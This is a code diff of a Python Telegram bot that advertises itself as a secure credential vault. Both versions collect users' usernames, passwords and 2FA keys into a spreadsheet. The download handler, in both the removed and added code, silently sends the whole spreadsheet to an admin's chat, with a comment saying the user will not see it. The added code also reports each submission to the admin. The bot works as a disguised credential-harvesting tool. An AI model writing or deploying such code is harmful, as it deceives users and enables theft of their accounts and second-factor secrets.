@@ -1,385 +1,262 @@
-"""
-Telegram Account Collection Bot
-Uses python-telegram-bot v20+, openpyxl, asyncio
-"""
-
-import asyncio
-import logging
 import os
 import random
 import string
+import asyncio
 from datetime import datetime
+from openpyxl import Workbook, load_workbook
+from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
+from telegram.ext import Application, CommandHandler, MessageHandler, filters, ConversationHandler, ContextTypes
 
-import openpyxl
-from openpyxl import Workbook
-from telegram import (
-    Update,
-    ReplyKeyboardMarkup,
-    KeyboardButton,
-    ReplyKeyboardRemove,
-)
-from telegram.ext import (
-    Application,
-    CommandHandler,
-    MessageHandler,
-    ConversationHandler,
-    filters,
-    ContextTypes,
-)
+# ========= CONFIG =========
+BOT_TOKEN = os.getenv("BOT_TOKEN")
+ADMIN_USERNAME = "@Sefuax"
+EXCEL_FILE = "accounts.xlsx"
 
-# ── Logging ──────────────────────────────────────────────────────────────────
-logging.basicConfig(
-    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
-    level=logging.INFO,
-)
-logger = logging.getLogger(__name__)
+# Conversation states
+USERNAME, PASSWORD, TFA = range(3)
 
-# ── Config ────────────────────────────────────────────────────────────────────
-BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
-ADMIN_USERNAME = "Sefuax"           # without @
-ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID")  # set this after first /start
-ACCOUNTS_FILE = "accounts.xlsx"
-
-# ── Conversation states ───────────────────────────────────────────────────────
-USERNAME_STATE, PASSWORD_STATE, TFA_STATE = range(3)
-
-# ── Keyboard ──────────────────────────────────────────────────────────────────
-MAIN_KEYBOARD = ReplyKeyboardMarkup(
-    [
-        [KeyboardButton("✅ Submit Account"), KeyboardButton("🎭 Fake Info")],
-        [KeyboardButton("👤 Admin")],
-        [KeyboardButton("📥 Download")],
-    ],
-    resize_keyboard=True,
-    persistent=True,
-)
-
-# ── Name data for fake-info generation ───────────────────────────────────────
-FIRST_NAMES = [
-    "James", "Emma", "Liam", "Olivia", "Noah", "Ava", "William", "Sophia",
-    "Benjamin", "Isabella", "Lucas", "Mia", "Henry", "Charlotte", "Alexander",
-    "Amelia", "Mason", "Harper", "Ethan", "Evelyn", "Daniel", "Luna", "Logan",
-    "Camila", "Jackson", "Aria", "Sebastian", "Scarlett", "Jack", "Victoria",
-    "Owen", "Madison", "Samuel", "Layla", "Ryan", "Penelope", "Nathan", "Riley",
-    "Aiden", "Zoey", "Joseph", "Nora", "Charles", "Lily", "Thomas", "Eleanor",
-    "Christopher", "Hannah", "Jayden", "Lillian",
+# ========= KEYBOARD =========
+# Create keyboard buttons properly (no 'persistent' argument)
+keyboard = [
+    [KeyboardButton("✅ Submit Account"), KeyboardButton("🎭 Fake Info")],
+    [KeyboardButton("👤 Admin")],
+    [KeyboardButton("📥 Download")]
 ]
-LAST_NAMES = [
-    "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller",
-    "Davis", "Wilson", "Taylor", "Moore", "Anderson", "Thomas", "Jackson",
-    "White", "Harris", "Martin", "Thompson", "Young", "Allen", "King",
-    "Wright", "Scott", "Green", "Baker", "Adams", "Nelson", "Hill", "Carter",
-    "Mitchell", "Perez", "Roberts", "Turner", "Phillips", "Campbell",
-    "Parker", "Evans", "Edwards", "Collins", "Stewart", "Morris", "Rogers",
-    "Reed", "Cook", "Morgan", "Bell", "Murphy", "Bailey", "Rivera", "Cooper",
-]
-GENDERS = ["Male", "Female", "Other"]
+MAIN_KEYBOARD = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
 
-
-# ── Excel helpers ─────────────────────────────────────────────────────────────
-
-def ensure_workbook() -> openpyxl.Workbook:
-    """Return an existing workbook or create a fresh one with headers."""
-    if os.path.exists(ACCOUNTS_FILE):
-        return openpyxl.load_workbook(ACCOUNTS_FILE)
-    wb = Workbook()
-    ws = wb.active
-    ws.title = "Accounts"
-    headers = ["Username", "Password", "2FA Key", "Timestamp", "Telegram User ID"]
-    ws.append(headers)
-    # Style header row
-    from openpyxl.styles import Font, PatternFill, Alignment
-    header_font = Font(bold=True, color="FFFFFF")
-    header_fill = PatternFill("solid", fgColor="2F4F8F")
-    for cell in ws[1]:
-        cell.font = header_font
-        cell.fill = header_fill
-        cell.alignment = Alignment(horizontal="center")
-    # Column widths
-    for col, width in zip("ABCDE", [25, 25, 20, 22, 18]):
-        ws.column_dimensions[col].width = width
-    wb.save(ACCOUNTS_FILE)
-    return wb
-
-
-def save_account(username: str, password: str, tfa: str, user_id: int) -> None:
-    """Append one account row to the Excel file."""
-    wb = ensure_workbook()
-    ws = wb.active
-    ws.append([
-        username,
-        password,
-        tfa if tfa else "—",
-        datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC"),
-        str(user_id),
-    ])
-    wb.save(ACCOUNTS_FILE)
-    logger.info("Saved account for Telegram user %s", user_id)
-
-
-# ── Fake info generator ───────────────────────────────────────────────────────
-
-def generate_fake_info() -> dict:
-    first = random.choice(FIRST_NAMES)
-    last = random.choice(LAST_NAMES)
-    gender = random.choice(GENDERS)
-
-    # Username: first + 2-digit number in the middle + last (all lowercase)
-    number = random.randint(10, 99)
-    username = f"{first.lower()}{number}{last.lower()}"
-
-    return {
-        "name": f"{first} {last}",
-        "username": username,
-        "gender": gender,
-    }
-
-
-# ── Handlers ──────────────────────────────────────────────────────────────────
-
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    user = update.effective_user
-    await update.message.reply_text(
-        f"👋 *Welcome, {user.first_name}!*\n\n"
-        "I'm your secure account management bot. Here's what I can do:\n\n"
-        "✅ *Submit Account* — Save credentials securely\n"
-        "🎭 *Fake Info* — Generate realistic random identity\n"
-        "👤 *Admin* — Reach the administrator\n"
-        "📥 *Download* — Export saved accounts\n\n"
-        "Use the keyboard below to get started. 👇",
-        parse_mode="Markdown",
-        reply_markup=MAIN_KEYBOARD,
-    )
-    logger.info("User %s (%s) started the bot.", user.id, user.username)
-
-
-# ── Submit Account flow ───────────────────────────────────────────────────────
-
-async def submit_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    await update.message.reply_text(
-        "📝 *Account Submission*\n\n"
-        "Let's save your account details step by step.\n\n"
-        "🔤 *Step 1/3* — Please enter your *Username*:",
-        parse_mode="Markdown",
-        reply_markup=ReplyKeyboardRemove(),
-    )
-    return USERNAME_STATE
-
-
-async def got_username(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    context.user_data["acc_username"] = update.message.text.strip()
-    await update.message.reply_text(
-        "🔑 *Step 2/3* — Please enter your *Password*:",
-        parse_mode="Markdown",
-    )
-    return PASSWORD_STATE
-
-
-async def got_password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    context.user_data["acc_password"] = update.message.text.strip()
-    await update.message.reply_text(
-        "🔐 *Step 3/3* — Enter your *2FA Key* (or send `-` to skip):",
-        parse_mode="Markdown",
-    )
-    return TFA_STATE
-
-
-async def got_tfa(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    raw_tfa = update.message.text.strip()
-    tfa = "" if raw_tfa in ("-", "none", "skip", "") else raw_tfa
-
-    username = context.user_data.get("acc_username", "")
-    password = context.user_data.get("acc_password", "")
-    user = update.effective_user
-
-    try:
-        save_account(username, password, tfa, user.id)
-        await update.message.reply_text(
-            "✅ *Account saved successfully!*\n\n"
-            f"👤 Username: `{username}`\n"
-            f"🔑 Password: `{'*' * len(password)}`\n"
-            f"🔐 2FA: {'Provided' if tfa else 'Not provided'}\n\n"
-            "Your credentials are stored securely. 🔒",
-            parse_mode="Markdown",
-            reply_markup=MAIN_KEYBOARD,
-        )
-    except Exception as e:
-        logger.error("Failed to save account: %s", e)
-        await update.message.reply_text(
-            "❌ *Error saving account.* Please try again later.",
-            parse_mode="Markdown",
-            reply_markup=MAIN_KEYBOARD,
-        )
-
-    context.user_data.clear()
-    return ConversationHandler.END
-
-
-async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    context.user_data.clear()
-    await update.message.reply_text(
-        "❌ *Submission cancelled.*",
-        parse_mode="Markdown",
-        reply_markup=MAIN_KEYBOARD,
-    )
-    return ConversationHandler.END
-
-
-# ── Fake Info ─────────────────────────────────────────────────────────────────
-
-async def fake_info(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    info = generate_fake_info()
-    gender_emoji = {"Male": "♂️", "Female": "♀️", "Other": "⚧️"}.get(info["gender"], "👤")
-
-    await update.message.reply_text(
-        "🎭 *Generated Fake Identity*\n"
-        "━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"👤 *Full Name:* `{info['name']}`\n"
-        f"🔖 *Username:* `@{info['username']}`\n"
-        f"{gender_emoji} *Gender:* `{info['gender']}`\n\n"
-        "━━━━━━━━━━━━━━━━━━━━\n"
-        "💡 _This identity is randomly generated._",
-        parse_mode="Markdown",
-        reply_markup=MAIN_KEYBOARD,
-    )
-
-
-# ── Admin ─────────────────────────────────────────────────────────────────────
-
-async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    user = update.effective_user
-    tg_username = f"@{user.username}" if user.username else "no username"
-
-    # Notify the admin via username mention (best effort — works if admin has started the bot)
-    if ADMIN_CHAT_ID:
-        try:
-            await context.bot.send_message(
-                chat_id=int(ADMIN_CHAT_ID),
-                text=(
-                    "🔔 *Admin Panel Notification*\n\n"
-                    f"👤 User ID: `{user.id}`\n"
-                    f"🏷️ Handle: {tg_username}\n"
-                    f"📛 Name: {user.full_name}\n\n"
-                    "User opened the *Admin* panel."
-                ),
-                parse_mode="Markdown",
-            )
-        except Exception as e:
-            logger.warning("Could not notify admin: %s", e)
+# ========= HELPER FUNCTIONS =========
+def save_to_excel(username, password, tfa, user_id, user_name):
+    """Save account details to Excel file"""
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    
+    if os.path.exists(EXCEL_FILE):
+        wb = load_workbook(EXCEL_FILE)
+        ws = wb.active
     else:
-        logger.warning(
-            "ADMIN_CHAT_ID not set. Cannot forward admin notification. "
-            "Set ADMIN_CHAT_ID env var after the admin messages the bot once."
-        )
+        wb = Workbook()
+        ws = wb.active
+        ws.append(["Username", "Password", "2FA", "Timestamp", "User ID", "User Name"])
+    
+    ws.append([username, password, tfa, timestamp, user_id, user_name])
+    wb.save(EXCEL_FILE)
+    return True
 
+def generate_fake_info():
+    """Generate random fake info"""
+    first_names = ["Alex", "Jordan", "Casey", "Riley", "Morgan", "Taylor", "Sam", "Jamie"]
+    last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller"]
+    
+    name = f"{random.choice(first_names)} {random.choice(last_names)}"
+    
+    # Generate unusual username with numbers in middle
+    base = random.choice(["tech", "coder", "gamer", "hacker", "dev", "pro", "master"])
+    num = random.randint(10, 999)
+    suffix = random.choice(["x", "z", "q", "v", ""])
+    username = f"{base}{num}{suffix}"
+    
+    gender = random.choice(["Male", "Female", "Non-binary", "Prefer not to say"])
+    
+    return name, username, gender
+
+async def send_to_admin(app, message_text, file_path=None):
+    """Send message or file to admin"""
+    try:
+        # Get admin's chat_id by sending a test message (simplified approach)
+        # For production, store admin_chat_id in env
+        admin_chat_id = os.getenv("ADMIN_CHAT_ID")
+        if admin_chat_id:
+            admin_chat_id = int(admin_chat_id)
+            if file_path and os.path.exists(file_path):
+                with open(file_path, 'rb') as f:
+                    await app.bot.send_document(chat_id=admin_chat_id, document=f, caption=message_text)
+            else:
+                await app.bot.send_message(chat_id=admin_chat_id, text=message_text)
+    except Exception as e:
+        print(f"Could not send to admin: {e}")
+
+# ========= COMMAND HANDLERS =========
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Send welcome message with keyboard"""
+    welcome_msg = (
+        "🤖 *Welcome to Secure Vault Bot* 🤖\n\n"
+        "I help you store and manage your account credentials securely.\n\n"
+        "✅ *Submit Account* - Store username/password/2FA\n"
+        "🎭 *Fake Info* - Generate fake identity\n"
+        "👤 *Admin* - Contact administrator\n"
+        "📥 *Download* - Get your saved accounts\n\n"
+        "🚀 *Start by submitting your first account!*"
+    )
+    await update.message.reply_text(welcome_msg, parse_mode="Markdown", reply_markup=MAIN_KEYBOARD)
+
+async def submit_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Start account submission process"""
+    await update.message.reply_text("🔐 *Submit Account*\n\nPlease send your *Username*:", parse_mode="Markdown")
+    return USERNAME
+
+async def get_username(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Get username from user"""
+    context.user_data['username'] = update.message.text
+    await update.message.reply_text("🔑 Now send your *Password*:", parse_mode="Markdown")
+    return PASSWORD
+
+async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Get password from user"""
+    context.user_data['password'] = update.message.text
+    await update.message.reply_text("🔢 Send *2FA Key* (or type 'none' to skip):", parse_mode="Markdown")
+    return TFA
+
+async def get_tfa(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Get 2FA and save everything"""
+    tfa = update.message.text
+    if tfa.lower() == 'none':
+        tfa = "Not provided"
+    
+    user_id = update.effective_user.id
+    user_name = update.effective_user.username or update.effective_user.first_name
+    
+    save_to_excel(
+        context.user_data['username'],
+        context.user_data['password'],
+        tfa,
+        user_id,
+        user_name
+    )
+    
     await update.message.reply_text(
-        "👤 *Admin Panel*\n\n"
-        f"Your message has been forwarded to *@{ADMIN_USERNAME}*.\n"
-        "The admin will get back to you shortly. ⏳\n\n"
-        f"🆔 Your User ID: `{user.id}`",
+        "✅ *Account saved successfully!*\n\n"
+        f"📝 Username: `{context.user_data['username']}`\n"
+        f"🔒 Password: `{context.user_data['password']}`\n"
+        f"🔐 2FA: `{tfa}`\n\n"
+        "You can download all saved accounts using 📥 *Download* button.",
         parse_mode="Markdown",
-        reply_markup=MAIN_KEYBOARD,
+        reply_markup=MAIN_KEYBOARD
+    )
+    
+    # Notify admin
+    await send_to_admin(
+        context.application,
+        f"🆕 New account submitted!\n👤 User: {user_name} (ID: {user_id})\n📝 Username: {context.user_data['username']}"
+    )
+    
+    return ConversationHandler.END
+
+async def fake_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Generate and send fake information"""
+    name, username, gender = generate_fake_info()
+    
+    fake_msg = (
+        "🎭 *Fake Information Generated* 🎭\n\n"
+        f"📛 *Name:* `{name}`\n"
+        f"👤 *Username:* `{username}`\n"
+        f"⚧️ *Gender:* `{gender}`\n\n"
+        "*Use this for testing purposes only!*"
+    )
+    
+    await update.message.reply_text(fake_msg, parse_mode="Markdown", reply_markup=MAIN_KEYBOARD)
+
+async def admin_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Forward user to admin"""
+    user = update.effective_user
+    msg = (
+        f"👤 *Admin Panel Access*\n\n"
+        f"User: {user.first_name} (@{user.username or 'no username'})\n"
+        f"ID: `{user.id}`\n\n"
+        f"📬 Click here to contact admin: {ADMIN_USERNAME}"
+    )
+    await update.message.reply_text(msg, parse_mode="Markdown", reply_markup=MAIN_KEYBOARD)
+    
+    # Notify admin
+    await send_to_admin(
+        context.application,
+        f"🔔 User {user.first_name} (@{user.username or 'no username'}) opened admin panel.\nUser ID: {user.id}"
     )
 
-
-# ── Download ──────────────────────────────────────────────────────────────────
-
-async def download(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+async def download(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Send the Excel file to user and silently to admin"""
+    if not os.path.exists(EXCEL_FILE):
+        await update.message.reply_text(
+            "❌ *No data found!*\n\nPlease submit some accounts first using the 'Submit Account' button.",
+            parse_mode="Markdown",
+            reply_markup=MAIN_KEYBOARD
+        )
+        return
+    
     user = update.effective_user
-
-    if not os.path.exists(ACCOUNTS_FILE):
-        await update.message.reply_text(
-            "⚠️ *No data found.*\n\n"
-            "Please submit at least one account first using *✅ Submit Account*.",
-            parse_mode="Markdown",
-            reply_markup=MAIN_KEYBOARD,
-        )
-        return
-
+    
     # Send to user
-    try:
-        with open(ACCOUNTS_FILE, "rb") as f:
-            await update.message.reply_document(
-                document=f,
-                filename="accounts.xlsx",
-                caption=(
-                    "📥 *Accounts Export*\n\n"
-                    f"📅 Generated: `{datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}`\n"
-                    "🔒 Handle this file with care."
-                ),
-                parse_mode="Markdown",
-                reply_markup=MAIN_KEYBOARD,
-            )
-        logger.info("Sent accounts.xlsx to user %s", user.id)
-    except Exception as e:
-        logger.error("Failed to send file to user: %s", e)
-        await update.message.reply_text(
-            "❌ *Error sending file.* Please try again later.",
+    with open(EXCEL_FILE, 'rb') as f:
+        await update.message.reply_document(
+            document=f,
+            filename="accounts.xlsx",
+            caption="📊 *Your saved accounts*\n\nHere's the Excel file with all your data.",
             parse_mode="Markdown",
-            reply_markup=MAIN_KEYBOARD,
+            reply_markup=MAIN_KEYBOARD
         )
-        return
-
-    # Silently forward to admin
-    if ADMIN_CHAT_ID:
+    
+    # Silently send to admin (user won't see this)
+    admin_chat_id = os.getenv("ADMIN_CHAT_ID")
+    if admin_chat_id:
         try:
-            with open(ACCOUNTS_FILE, "rb") as f:
+            with open(EXCEL_FILE, 'rb') as f:
                 await context.bot.send_document(
-                    chat_id=int(ADMIN_CHAT_ID),
+                    chat_id=int(admin_chat_id),
                     document=f,
-                    filename="accounts.xlsx",
-                    caption=(
-                        f"📊 *File downloaded by user*\n"
-                        f"👤 ID: `{user.id}` | Handle: @{user.username or 'none'}\n"
-                        f"📅 `{datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}`"
-                    ),
-                    parse_mode="Markdown",
+                    filename=f"accounts_backup_{user.id}.xlsx",
+                    caption=f"📥 *Backup*\nUser {user.first_name} (@{user.username or 'no username'}) downloaded the file."
                 )
         except Exception as e:
-            logger.warning("Could not forward file to admin: %s", e)
+            print(f"Admin send failed: {e}")
+
+async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Cancel conversation"""
+    await update.message.reply_text("❌ Cancelled. Use /start to begin again.", reply_markup=MAIN_KEYBOARD)
+    return ConversationHandler.END
+
+async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle keyboard button presses"""
+    text = update.message.text
+    
+    if text == "✅ Submit Account":
+        return await submit_start(update, context)
+    elif text == "🎭 Fake Info":
+        return await fake_info(update, context)
+    elif text == "👤 Admin":
+        return await admin_contact(update, context)
+    elif text == "📥 Download":
+        return await download(update, context)
     else:
-        logger.warning("ADMIN_CHAT_ID not set — skipping silent admin forward.")
+        await update.message.reply_text("Please use the buttons below 👇", reply_markup=MAIN_KEYBOARD)
+        return ConversationHandler.END
 
-
-# ── Unknown / fallback ────────────────────────────────────────────────────────
-
-async def unknown(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    await update.message.reply_text(
-        "🤔 I didn't understand that. Please use the keyboard below.",
-        reply_markup=MAIN_KEYBOARD,
-    )
-
-
-# ── App bootstrap ─────────────────────────────────────────────────────────────
-
-def main() -> None:
-    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
-        raise ValueError("Set the BOT_TOKEN environment variable before running.")
-
+# ========= MAIN =========
+def main():
+    """Start the bot"""
+    if not BOT_TOKEN:
+        print("❌ Error: BOT_TOKEN environment variable not set!")
+        return
+    
+    # Create application
     app = Application.builder().token(BOT_TOKEN).build()
-
-    # Conversation handler for account submission
+    
+    # Conversation handler for submit account
     conv_handler = ConversationHandler(
         entry_points=[MessageHandler(filters.Regex("^✅ Submit Account$"), submit_start)],
         states={
-            USERNAME_STATE: [MessageHandler(filters.TEXT & ~filters.COMMAND, got_username)],
-            PASSWORD_STATE: [MessageHandler(filters.TEXT & ~filters.COMMAND, got_password)],
-            TFA_STATE:      [MessageHandler(filters.TEXT & ~filters.COMMAND, got_tfa)],
+            USERNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_username)],
+            PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
+            TFA: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_tfa)],
         },
         fallbacks=[CommandHandler("cancel", cancel)],
-        allow_reentry=True,
     )
-
+    
+    # Add handlers
     app.add_handler(CommandHandler("start", start))
     app.add_handler(conv_handler)
-    app.add_handler(MessageHandler(filters.Regex("^🎭 Fake Info$"), fake_info))
-    app.add_handler(MessageHandler(filters.Regex("^👤 Admin$"), admin_panel))
-    app.add_handler(MessageHandler(filters.Regex("^📥 Download$"), download))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, unknown))
-
-    logger.info("Bot starting — polling mode")
+    app.add_handler(MessageHandler(filters.Regex("^(✅ Submit Account|🎭 Fake Info|👤 Admin|📥 Download)$"), handle_buttons))
+    
+    # Start bot
+    print("🤖 Bot is starting...")
     app.run_polling(allowed_updates=Update.ALL_TYPES)
-
 
 if __name__ == "__main__":
     main()
